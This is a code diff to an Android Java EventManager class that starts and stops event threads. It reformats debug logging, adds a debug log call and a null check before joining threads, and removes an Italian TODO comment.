@@ -11,6 +11,8 @@ import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
 
+import android.util.Log;
+
 import com.android.service.Manager;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
@@ -78,12 +80,14 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 		events = status.getEventsMap();
 
 		if (events == null) {
-			if(Cfg.DEBUG) Check.log( TAG + " Events map null");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Events map null");
 			return false;
 		}
 
 		if (running == null) {
-			if(Cfg.DEBUG) Check.log( TAG + " Running Events map null");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Running Events map null");
 			return false;
 		}
 
@@ -94,7 +98,8 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 
 			final EventConf conf = pairs.getValue();
 			final Integer type = conf.getType();
-			if(Cfg.DEBUG) Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");
+			if (Cfg.DEBUG)
+				Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");
 
 			final EventBase e = createEvent(type, conf);
 
@@ -107,10 +112,12 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 						t.setName(e.getClass().getSimpleName());
 					}
 					t.start();
-					if(Cfg.DEBUG) Check.log( TAG + " (startAll): " + e);
+					if (Cfg.DEBUG)
+						Check.log(TAG + " (startAll): " + e);
 					threads.put(e, t);
 				} else {
-					if(Cfg.DEBUG) Check.log( TAG + " Warn: event already running");
+					if (Cfg.DEBUG)
+						Check.log(TAG + " Warn: event already running");
 				}
 			}
 		}
@@ -118,41 +125,53 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 		return true;
 	}
 
-	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
 	/**
 	 * Stop events.
 	 */
 	public void stopAll() {
 		final Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet().iterator();
 
+		if (Cfg.DEBUG)
+			Log.d("QZ", TAG + " (stopAll)");
+
 		while (it.hasNext()) {
 			final Map.Entry<Integer, EventBase> pairs = it.next();
 			final EventBase event = pairs.getValue();
 
-			if(Cfg.DEBUG) Check.log( TAG + " Stopping: " + event);
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Stopping: " + event);
 
 			if (event.isRunning()) {
 				event.stopThread();
 
 				try {
 					final Thread t = (Thread) threads.get(event);
-					if(Cfg.DEBUG) Check.asserts(t != null, "Null thread");
+					if (Cfg.DEBUG)
+						Check.asserts(t != null, "Null thread");
 
-					t.join();
-					threads.remove(event);
+					if (t != null) {
+						t.join();
+						threads.remove(event);
+					}
 
 				} catch (final InterruptedException e) {
-					if(Cfg.DEBUG) { Check.log(e); }
-					if(Cfg.DEBUG) Check.log( TAG + " Error: " + e.toString());
+					if (Cfg.DEBUG) {
+						Check.log(e);
+					}
+					if (Cfg.DEBUG)
+						Check.log(TAG + " Error: " + e.toString());
 				}
 			} else {
-				if(Cfg.DEBUG) Check.asserts(threads.get(event) == null, "Shouldn't find a thread");
+				if (Cfg.DEBUG)
+					Check.asserts(threads.get(event) == null, "Shouldn't find a thread");
 			}
 
 		}
 
-		if(Cfg.DEBUG) Check.ensures(threads.size() == 0, "Non empty threads");
-		if(Cfg.DEBUG) Check.ensures(running.size() == 0, "Non empty running");
+		if (Cfg.DEBUG)
+			Check.ensures(threads.size() == 0, "Non empty threads");
+		if (Cfg.DEBUG)
+			Check.ensures(running.size() == 0, "Non empty running");
 
 		running.clear();
 		threads.clear();
